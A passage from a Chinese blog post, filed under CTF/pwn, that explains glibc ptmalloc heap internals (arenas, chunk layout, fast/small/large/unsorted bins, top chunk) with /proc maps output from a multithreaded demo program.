539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">b7e05000-b7e07000 rw-p 00000000 00:00 0 </span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure></p><p><strong>第一次申请后， 从下面的输出可以看出，堆段被建立了，并且它就紧邻着数据段</strong>，这说明malloc的背后是用brk函数来实现的。同时，需要注意的是，我们虽然只是申请了1000个字节，但是我们却得到了0x0806c000-0x0804b000=0x21000个字节的堆。这说明虽然程序可能只是向操作系统申请很小的内存，但是为了方便，操作系统会把很大的内存分配给程序。这样的话，就避免了多次内核态与用户态的切换，提高了程序的效率。<strong>我们称这一块连续的内存区域为 arena。此外，我们称由主线程申请的内存为 main_arena。</strong> 后续的申请的内存会一直从这个 arena 中获取，直到空间不足。当 arena 空间不足时，它可以通过增加brk的方式来增加堆的空间。类似地，arena 也可以通过减小 brk 来缩小自己的空间。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread </span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc in main thread</span><br><span class="line">After malloc and before free in main thread</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7e05000-b7e07000 rw-p 00000000 00:00 0 </span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure></p><p><strong>在主线程释放内存后</strong>，我们从下面的输出可以看出，其对应的 arena 并没有进行回收，而是交由glibc来进行管理。当后面程序再次申请内存时，在 glibc 中管理的内存充足的情况下，glibc 就会根据堆分配的算法来给程序分配相应的内存。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread </span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc in main thread</span><br><span class="line">After malloc and before free in main thread</span><br><span class="line">After free in main thread</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/lsploits/hof/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7e05000-b7e07000 rw-p 00000000 00:00 0 </span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure></p><p><strong>在第一个线程malloc之前</strong>，我们可以看到并没有出现与线程1相关的堆，但是出现了与线程1相关的栈。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread </span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc in main thread</span><br><span class="line">After malloc and before free in main thread</span><br><span class="line">After free in main thread</span><br><span class="line">Before malloc in thread 1</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7604000-b7605000 ---p 00000000 00:00 0 </span><br><span class="line">b7605000-b7e07000 rw-p 00000000 00:00 0          [stack:6594]</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure></p><p><strong>第一个线程malloc后</strong>， 我们可以从下面输出看出线程1的堆段被建立了。而且它所在的位置为内存映射段区域，同样大小也是132KB(b7500000-b7521000)。因此这表明该线程申请的堆时，背后对应的函数为mmap函数。同时，我们可以看出实际真的分配给程序的内存为1M(b7500000-b7600000)。而且，只有132KB的部分具有可读可写权限，这一块连续的区域成为<strong>thread arena</strong>。</p><p><strong>注意：</strong><br><strong>当用户请求的内存大于128KB时，并且没有任何arena有足够的空间时，那么系统就会执行mmap函数来分配相应的内存空间。这与这个请求来自于主线程还是从线程无关。</strong></p><p><strong>ptmalloc在开始时，若请求的空间小于 mmap 分配阈值(mmap threshold，默认值为 128KB)时，主分配区会调用 sbrk()增加一块大小为 (128 KB + chunk_size) align 4KB 的空间作为 heap。非主分配区会调用 mmap 映射一块大小为 HEAP_MAX_SIZ(E 32位系统上默认为1MB，64位系统上默认为64MB)的空间作为sub-heap。<br>当用户请求内存分配时，首先会在这个区域内找一块合适的chunk给用户。当用户释放了heap 中的chunk时，ptmalloc又会使用fast bins 和 bins 来组织空闲 chunk。以备用户的下一次分配。<br>若需要分配的 chunk 大小小于 mmap 分配阈值，而 heap 空间又不够，则此时主分配区会通过 sbrk()调用来增加 heap 大小，非主分配区会调用mmap映射一块新的sub-heap，也就是增加top chunk的大小，每次heap增加的值都会对齐到4KB。<br>当用户的请求超过mmap 分配阈值，并且主分配区使用sbrk()分配失败的时候，或是非主分配区在 top chunk 中不能分配到需要的内存时，ptmalloc 会尝试使用 mmap()直接映射一 块内存到进程内存空间。使用 mmap()直接映射的 chunk 在释放时直接解除映射，而不再属于进程的内存空间。任何对该内存的访问都会产生段错误。而在 heap 中或是 sub-heap 中分 配的空间则可能会留在进程内存空间内，还可以再次引用(当然是很危险的)。</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread </span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc in main thread</span><br><span class="line">After malloc and before free in main thread</span><br><span class="line">After free in main thread</span><br><span class="line">Before malloc in thread 1</span><br><span class="line">After malloc and before free in thread 1</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7500000-b7521000 rw-p 00000000 00:00 0 </span><br><span class="line">b7521000-b7600000 ---p 00000000 00:00 0 </span><br><span class="line">b7604000-b7605000 ---p 00000000 00:00 0 </span><br><span class="line">b7605000-b7e07000 rw-p 00000000 00:00 0          [stack:6594]</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure><p><strong>在第一个线程释放内存后</strong>， 我们可以从下面的输出看到，这样释放内存同样不会把内存重新给系统。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread </span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc in main thread</span><br><span class="line">After malloc and before free in main thread</span><br><span class="line">After free in main thread</span><br><span class="line">Before malloc in thread 1</span><br><span class="line">After malloc and before free in thread 1</span><br><span class="line">After free in thread 1</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">08049000-0804a000 r--p 00000000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804a000-0804b000 rw-p 00001000 08:01 539625     /home/sploitfun/ptmalloc.ppt/mthread/mthread</span><br><span class="line">0804b000-0806c000 rw-p 00000000 00:00 0          [heap]</span><br><span class="line">b7500000-b7521000 rw-p 00000000 00:00 0 </span><br><span class="line">b7521000-b7600000 ---p 00000000 00:00 0 </span><br><span class="line">b7604000-b7605000 ---p 00000000 00:00 0 </span><br><span class="line">b7605000-b7e07000 rw-p 00000000 00:00 0          [stack:6594]</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$</span><br></pre></td></tr></table></figure><h2 id="Arena"><a href="#Arena" class="headerlink" title="Arena"></a>Arena</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-092939.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-092947.jpg" alt=""><br>在我们之前介绍的例子中，无论是主线程还是新创建的线程，在第一次申请内存时，都会有独立的arena。那么会不会每个线程都有独立的arena呢？下面我们就具体介绍。</p><h3 id="arena-数量"><a href="#arena-数量" class="headerlink" title="arena 数量"></a>arena 数量</h3><p>对于不同系统，arena数量的约束如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">For 32 bit systems:</span><br><span class="line">     Number of arena = 2 * number of cores.</span><br><span class="line">For 64 bit systems:</span><br><span class="line">     Number of arena = 8 * number of cores.</span><br></pre></td></tr></table></figure></p><p>显然，不是每一个线程都会有对应的 arena。至于为什么64位系统，要那么设置，我也没有想明白。此外，因为每个系统的核数是有限的，当线程数大于核数的二倍（超线程技术）时，就必然有线程处于等待状态，所以没有必要为每个线程分配一个arena。</p><h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><p>与 thread 不同的是，main_arena 并不在申请的 heap 中，而是一个<a href="https://github.com/sploitfun/lsploits/blob/master/glibc/malloc/malloc.c#L1740" target="_blank" rel="noopener">全局变量</a>，在 libc.so 的数据段。</p><h3 id="heap-info"><a href="#heap-info" class="headerlink" title="heap_info"></a>heap_info</h3><p>程序刚开始执行时，每个线程是没有 heap 区域的。当其申请内存时，就需要一个结构来记录对应的信息，而heap_info 的作用就是这个。而且当该heap的资源被使用完后，就必须得再次申请内存了。此外，一般申请的heap 是不连续的，因此需要记录不同heap之间的链接结构。</p><p><strong>该数据结构是专门为从 Memory Mapping Segment 处申请的内存准备的，即为非主线程准备的。</strong></p><p>主线程可以通过 sbrk() 函数扩展 program break location 获得（直到触及Memory Mapping Segment），只有一个heap，没有 heap_info 数据结构。</p><h3 id="malloc-state"><a href="#malloc-state" class="headerlink" title="malloc_state"></a>malloc_state</h3><p>该结构用于管理堆，记录每个 arena 当前申请的内存的具体状态，比如说是否有空闲chunk，有什么大小的空闲chunk 等等。无论是 thread arena 还是 main arena，它们都只有一个 malloc state 结构。由于 thread 的 arena 可能有多个，malloc state结构会在最新申请的arena中。</p><p>注意，main arena 的 malloc_state 并不是 heap segment 的一部分，而是一个全局变量，存储在 libc.so 的数据段。</p><h2 id="chunk"><a href="#chunk" class="headerlink" title="chunk"></a>chunk</h2><p>以下结构体代表在内存中的一块特定堆块(chunk)，有些结构体成员对于已分配和未分配的堆块有着不同的意义。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      mchunk_size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>                <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">mchunkptr</span>;</span></span><br></pre></td></tr></table></figure></p><h3 id="Allocated-chunk"><a href="#Allocated-chunk" class="headerlink" title="Allocated chunk"></a>Allocated chunk</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-092353.jpg" alt=""><br>一个使用中的chunk(使用中，就是指还没有被free掉)在内存中的样子如图所示。<br>在图中，chunk 指针指向一个 chunk 的开始，一个 chunk 中包含了用户请求的内存区域和相关的控制信息。<br><strong>图中的 mem 指针才是真正返回给用户的内存指针。</strong><br>chunk 的第二个域的最低一位为 P，它表示前一个块是否在使用中，<strong>P 为 0 则表示前一个 chunk 为空闲（并非指链表中的前一个堆块，而是连续内存中的前一块内存），这时 chunk 的第一个域 prev_size 才有效</strong>，prev_size 表示前一个 chunk 的 size，程序可以使用这个值来找到前一个 chunk 的开始地址。<br>当 P 为 1 时，表示前一个 chunk 正在使用中，prev_size无效，程序也就不可以得到前一个 chunk 的大小。不能对前一个 chunk 进行任何操作。ptmalloc 分配的第一个块总是将 P 设为 1，以防止程序引用到不存在的区域。<br>Chunk的第二个域的倒数第二个位为M，他表示当前chunk是从哪个内存区域获得的虚拟内存。M 为 1 表示该 chunk 是从 mmap 映射区域分配的，否则是从 heap 区域分配的。<br>Chunk 的第二个域倒数第三个位为 A，表示该 chunk 属于主分配区或者非主分配区，如果属于非主分配区，将该位置为 1，否则置为 0。 </p><h3 id="Free-chunk"><a href="#Free-chunk" class="headerlink" title="Free chunk"></a>Free chunk</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-092300.jpg" alt=""><br>空闲 chunk 在内存中的结构如图所示。<br>当 chunk 空闲时，其 M 状态不存在，只有 AP 状态。<br>原本是用户数据区的地方存储了四个指针，指针 fd 指向后一个空闲的 chunk，而 bk 指向前一个空闲的 chunk，ptmalloc 通过这两个指针将大小相近的 chunk 连成一个双向链表。<br>对于 large bin 中的空闲 chunk，还有两个指针，fd_nextsize 和 bk_nextsize，这两个指针用于加快在 large bin 中查找最近匹配的空闲 chunk。<br>不同的 chunk 链表又是通过 bins 或者 fastbins 来组织的</p><h3 id="chunk-中的空间复用"><a href="#chunk-中的空间复用" class="headerlink" title="chunk 中的空间复用"></a>chunk 中的空间复用</h3><p>为了使得 chunk 所占用的空间最小，ptmalloc 使用了空间复用，一个 chunk 或者正在被使用，或者已经被 free 掉，所以 chunk 的中的一些域可以在使用状态和空闲状态表示不同的意义，来达到空间复用的效果。<br>以 32 位系统为例，空闲时，一个 chunk 中至少需要 4 个 size_t(4B)大小的空间，用来存储 prev_size，size，fd 和 bk (见上图)，也就是 16B， chunk 的大小要对齐到 8B。<br>当一个 chunk 处于使用状态时，它的下一个 chunk 的 prev_size 域肯定是无效的。所以实际上，这个空间也可以被当前 chunk 使用。<br>这听起来有点不可思议， 但确实是合理空间复用的例子。故而实际上，一个使用中的 chunk 的大小的计算公式应该是: in_use_size = (用户请求大小+ 8 - 4 ) align to 8B，<strong>这里加 8 是因为需要存储 prev_size 和 size， 但又因为向下一个 chunk“借”了 4B，所以要减去 4。</strong><br>最后，因为空闲的 chunk 和使用中的 chunk 使用的是同一块空间。所以肯定要取其中最大者作为实际的分配空间。即最终的分配空间 chunk_size = max(in_use_size, 16)。这就是当用户请求内存分配时，ptmalloc 实际需要分配的内存大小。</p><h2 id="bins"><a href="#bins" class="headerlink" title="bins"></a>bins</h2><p>bin是一个由<strong>空闲</strong>(未分配)堆块组成的(双向或单向)链表。Bins根据所包含的区块大小进行区分：</p><ul><li>Fast bin</li><li>Unsorted bin</li><li>Small bin</li><li>Large bin</li></ul><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-120518.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-123923.jpg" alt=""><br>用户 free 掉的内存并不是都会马上归还给系统，ptmalloc 会统一管理 heap 和 mmap 映射区域中的空闲的 chunk。<br>当用户进行下一次分配请求时，ptmalloc 会首先试图在空闲的 chunk 中挑选一块给用户，这样就避免了频繁的系统调用，降低了内存分配的开销。<br>ptmalloc 将相似大小的 chunk 用双向链表链接起来，这样的一个链表被称为一个 bin。<br>Ptmalloc 一共 维护了 128 个 bin（<strong>实际上bin[0]和bin[127]都不存在，bin[1]是unsorted bins</strong>)，并使用一个数组来存储这些 bin(如下图所示)。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-124631.jpg" alt=""><br>数组中的 bin 依次介绍如下</p><ul><li>第一个为 unsorted bin，字如其面，这里面的 chunk 没有进行排序，存储的 chunk 比较杂。</li><li>索引从 2 到 63 的 bin 称为 small bin，同一个 small bin 链表中的 chunk 的大小相同。两个相邻索引的 small bin 链表中的 chunk 大小相差的字节数为2个机器字长，即32位相差8字节，64位相差16字节。</li><li>small bins 后面的 bin 被称作 large bins。large bins 中的每一个 bin 都包含一定范围内的 chunk，其中的chunk 按 fd 指针的顺序从大到小排列。相同大小的chunk同样按照最近使用顺序排列。</li></ul><p>当空闲的 chunk 被链接到 bin 中的时候，ptmalloc 会把表示该 chunk 是否处于使用中的 标志 P 设为 0(注意，这个标志实际上处在下一个 chunk 中)，同时 ptmalloc 还会检查它前后的 chunk 是否也是空闲的，如果是的话，ptmalloc 会首先把它们合并为一个大的 chunk， 然后将合并后的 chunk 放到 unstored bin中。</p><p>此外，上述这些bin的排布都会遵循一个原则：<strong>任意两个物理相邻的空闲chunk不能在一起。</strong></p><p>需要注意的是，并不是所有的 chunk 被释放后就立即被放到 bin 中。ptmalloc 为了提高分配的速度，会把一些小的 chunk 先放到 fast bins 的容器内。而且，<strong>fastbin 容器中的 chunk 的使用标记总是被置位的，所以不满足上面的原则。</strong></p><ul><li><strong>Fast bins 是小内存块的高速缓存，当一些大小小于等于64 字节的 chunk 被回收时，首先会放入 fast bins 中，在分配小内存时，首先会查看 fast bins 中是否有合适的内存块，如果存在，则直接返回 fast bins 中的内存块，以加快分配速度。</strong></li><li><strong>Usorted bin 只有一个，回收的chunk块必须先放到unsorted bin中，分配内存时会查看unsorted bin中是否有 合适的chunk，如果找到满足条件的chunk，则直接返回给用户，否则将unsorted bin的所有chunk 放入 small bins 或是 large bins 中。</strong></li><li><strong>Small bins 用于存储大小小于512B或1024B固定大小的chunk，共 62 个 bin，最小的 chunk 大小为 16 字节或 32 字节，每个 bin 的大小相差 8 字节或是 16 字节，当分配小内存块时，采用精确匹配的方式从 small bins 中查找合适的 chunk。</strong></li><li><strong>Large bins 用于存储大于等于 512B 或 1024B 的空闲 chunk，这些 chunk 使用双向链表的形式按大小顺序排序，分配内存时按最近匹配方式从 large bins 中分配 chunk。</strong></li></ul><h3 id="Small-bin"><a href="#Small-bin" class="headerlink" title="Small bin"></a>Small bin</h3><p>ptmalloc使用small bins管理空闲小chunk，每个small bin中的chunk的大小与bin的index 有如下关系:<br>Chunk_size=<code>2 * SIZE_SZ * index</code><br>在 SIZE_SZ 为 4B 的平台上，small bins 中的 chunk 大小是以 8B 为公差的等差数列，最大 的 chunk 大小为 504B，最小的 chunk 大小为 16B，所以实际共 62 个 bin。分别为 16B、24B、 32B，……，504B。在SIZE_SZ为8B的平台上，small bins中的chunk大小是以16B为公差 的等差数列，最大的chunk大小为1008B，最小的chunk大小为32B，所以实际共62个bin。 分别为 32B、48B、64B，…… 1008B。<br>ptmalloc 维护了 62 个双向环形链表(每个链表都具有链表头节点，加头节点的最大作用就是便于对链表内节点的统一处理，即简化编程)，每一个链表内的各空闲 chunk 的大小 一致，因此当应用程序需要分配某个字节大小的内存空间时直接在对应的链表内取就可以了，这样既可以很好的满足应用程序的内存空间申请请求而又不会出现太多的内存碎片。我们可以用如下图来表示在 SIZE_SZ 为 4B 的平台上 ptmalloc 对 512B 字节以下的空闲 chunk 组织方式(所谓的分箱机制)。<br><strong>small bins 中每个 bin 对应的链表采用 FIFO 的规则，所以同一个链表中先被释放的 chunk 会先被分配出去。</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-131532.png" alt=""></p><h3 id="Large-bins"><a href="#Large-bins" class="headerlink" title="Large bins"></a>Large bins</h3><p>在 SIZE_SZ 为 4B 的平台上，大于等于 512B 的空闲 chunk，或者，在 SIZE_SZ 为 8B 的平 台上，大小大于等于 1024B 的空闲 chunk，由 sorted bins 管理。Large bins 一共包括 63 个 bin， 每个 bin 中的 chunk 大小不是一个固定公差的等差数列，而是分成 6 组 bin，每组 bin 是一个 固定公差的等差数列，每组的 bin 数量依次为 32、16、8、4、2、1，公差依次为 64B、512B、 4096B、32768B、262144B 等。<br>以 SIZE_SZ 为 4B 的平台为例，第一个 large bin 的起始 chunk 大小为 512B，共 32 个 bin， 公差为 64B，等差数列满足如下关系:<br>Chunk_size=512 + 64 * index<br>第二个 large bin 的起始 chunk 大小为第一组 bin 的结束 chunk 大小，满足如下关系:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Chunk_size=512 + 64 * 32 + 512 * index</span><br></pre></td></tr></table></figure></p><p>同理，我们可计算出每个 bin 的起始 chunk 大小和结束 chunk 大小。</p><h3 id="Unsorted-bins"><a href="#Unsorted-bins" class="headerlink" title="Unsorted bins"></a>Unsorted bins</h3><p>Unsorted bin 可以看作是 small bins 和 large bins 的 cache，只有一个 unsorted bin，以双向链表管理空闲 chunk，空闲 chunk 不排序，所有的 chunk 在回收时都要先放到 unsorted bin中。<br>分配时，如果在 unsorted bin 中没有合适的 chunk，就会把 unsorted bin 中的所有 chunk 分别加入到所属的 bin 中，然后再在 bin 中分配合适的 chunk。Bins 数组中的元素 bin[1]用于 存储 unsorted bin 的 chunk 链表头。<br><strong>此外，Unsorted Bin 在使用的过程中，采用的遍历顺序是 FIFO 。</strong></p><h3 id="Fast-bins"><a href="#Fast-bins" class="headerlink" title="Fast bins"></a>Fast bins</h3><p>Fast bins主要是用于高小内存的分配效率，<strong>采用LIFO</strong>，默认情况下，对于SIZE_SZ为4B的平台， 小于 64B 的 chunk 分配请求，对于 SIZE_SZ 为 8B 的平台，小于128B 的 chunk 分配请求，首先会查找fast bins中是否有所需大小的 chunk 存在(精确匹配)，如果存在，就直接返回。<br>Fast bins 可以看着是 small bins 的一小部分 cache，默认情况下，fast bins 只 cache 了 small bins 的前 7 个大小的空闲 chunk，也就是说，对于 SIZE_SZ 为 4B 的平台，fast bins 有 7 个 chunk 空闲链表(bin)，每个 bin 的 chunk 大小依次为 16B，24B，32B，40B，48B，56B，64B;对 于SIZE_SZ为8B的平台，fast bins有7个chunk空闲链表(bin)，每个bin的chunk大小依 次为 32B，48B，64B，80B，96B，112B，128B。<br><strong>默认情况下（32位系统为例）， fastbin 中默认支持最大的 chunk 的数据空间大小为 64 字节。但是其可以支持的chunk的数据空间最大为80字节。除此之外， fastbin 最多可以支持的 bin 的个数为 10 个，从数据空间为8字节开始一直到80字节</strong></p><p><strong>需要特别注意的是，fastbin 范围的 chunk 的 inuse 始终被置为 1。因此它们不会和其它被释放的chunk合并。</strong></p><h2 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h2><p>程序第一次进行 malloc 的时候，heap 会被分为两块，一块给用户，剩下的那块就是 top chunk。其实，所谓的top chunk 就是处于当前堆的物理地址最高的 chunk。这个 chunk 不属于任何一个 bin，它的作用在于当所有的bin都无法满足用户请求的大小时，如果其大小不小于指定的大小，就进行分配，并将剩下的部分作为新的top chunk。否则，就对heap进行扩展后再进行分配。在main arena中通过sbrk扩展heap，而在thread arena中通过mmap分配新的heap。</p><p><strong>需要注意的是，top chunk 的 prev_inuse 比特位始终为1，否则其前面的chunk就会被合并到top chunk中。</strong></p><p>初始情况下，我们可以将 unsorted chunk 作为 top chunk。</p><h2 id="mmaped-chunk"><a href="#mmaped-chunk" class="headerlink" title="mmaped chunk"></a>mmaped chunk</h2><p>当需要分配的 chunk 足够大，而且 fast bins 和 bins 都不能满足要求，甚至 top chunk 本身也不能满足分配需求时，ptmalloc 会使用 mmap 来直接使用内存映射来将页映射到进程空间。这样分配的 chunk 在被 free 时将直接解除映射，于是就将内存归还给了操作系统，再次对这样的内存区的引用将导致segmentation fault错误。这样的chunk也不会包含在任何bin中。</p><h2 id="Last-remainder"><a href="#Last-remainder" class="headerlink" title="Last remainder"></a>Last remainder</h2><p>Last remainder 是另外一种特殊的 chunk，就像 top chunk 和 mmaped chunk 一样，不会在任何 bins 中找到这种 chunk。当需要分配一个 small chunk，但在small bins 中找不到合适 的 chunk，如果 last remainder chunk 的大小大于所需的 small chunk 大小，last remainder chunk 被分裂成两个 chunk，其中一个 chunk 返回给用户，另一个 chunk 变成新的 last remainder chuk。</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
          <category> 堆利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 堆基础 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>64位rop的一些原理和思路(慢慢更新)</title>
      <link href="/2018/02/27/lctf1/"/>
      <url>/2018/02/27/lctf1/</url>
